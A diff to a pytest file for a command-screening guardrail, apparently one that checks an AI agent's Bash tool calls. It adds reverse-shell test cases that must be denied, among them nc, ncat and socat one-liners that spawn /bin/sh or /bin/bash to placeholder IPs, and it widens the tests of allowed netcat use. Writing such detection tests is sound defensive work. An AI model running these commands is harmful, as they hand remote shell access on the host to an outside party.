@@ -3335,6 +3335,13 @@ def test_s6_gzip_to_local_file_not_denied():
     "mkfifo /tmp/f && nc 10.0.0.1 4444 < /tmp/f",
     "python3 -c 'import socket,pty,os; pty.spawn(\"/bin/bash\")'",
     "perl -e 'use Socket; print 1'",
+    # Direct exec-flag form (panel-6 guardrails-security-v4 S6, 2026-08-19):
+    # a stale comment claimed this was already covered — no regex ever
+    # matched it.
+    "nc -e /bin/sh 1.2.3.4 4444",
+    "ncat -e /bin/bash 10.0.0.1 4444",
+    "ncat -c /bin/sh 10.0.0.1 4444",
+    "socat TCP:10.0.0.1:4444 EXEC:/bin/bash",
 ])
 def test_s6_reverse_shell_shape_denied(cmd):
     r = analyzer.evaluate("Bash", {"command": cmd})
@@ -3342,12 +3349,18 @@ def test_s6_reverse_shell_shape_denied(cmd):
     assert r["rule_triggered"] == "bash_web_egress_reverse_shell", (cmd, r)
 
 
-def test_s6_legit_scp_copy_not_denied():
-    r = analyzer.evaluate("Bash", {"command": "scp file.txt user@host:/tmp/"})
+@pytest.mark.parametrize("cmd", [
+    "scp file.txt user@host:/tmp/",
+    "nc -zv host.example.com 80",
+    "nc -l -p 4444",
+    "nc -w 3 host.example.com 80",
+])
+def test_s6_legit_netcat_use_not_denied(cmd):
+    r = analyzer.evaluate("Bash", {"command": cmd})
     assert r["rule_triggered"] not in (
         "bash_web_egress_reverse_shell", "bash_web_egress_upload_form",
         "bash_web_egress_archive_pipe",
-    ), r
+    ), (cmd, r)
 
 
 # ── RT12 — inline-interpreter scope narrowing: os.system/os.popen/
